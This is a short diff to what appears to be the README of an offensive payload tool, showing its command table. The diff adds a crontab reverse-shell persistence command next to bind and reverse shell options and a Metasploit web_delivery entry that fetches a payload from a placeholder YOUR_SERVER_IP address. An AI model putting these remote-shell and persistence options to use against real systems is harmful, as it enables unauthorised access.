@@ -69,11 +69,12 @@ Sending payload to http://192.168.1.1/runlivepayload
 | Commands       | Description                           |
 | :------------- | :-------------                        |
 | bind           | initiate a bind shell on results.port |
-| reverse        | initiate a reverse shell on results.host and results.port|
+| reverse        | initiate a reverse shell on results.host and results.port |
+| crontab        | set up a crontab reverse shell on results.host and results.port |
 | meterpreter [https://YOUR_SERVER_IP:4646/posh-payload] | use exploit/multi/script/web_delivery with a posh-payload    |
-| send some text  | send the specified text              |
-| h               | help                                 |
-| q               | quit                                 |
+| send some text | send the specified text              |
+| h              | help                                 |
+| q              | quit                                 |
 
 You can change the options with `SET option_name option_value`
 ```c
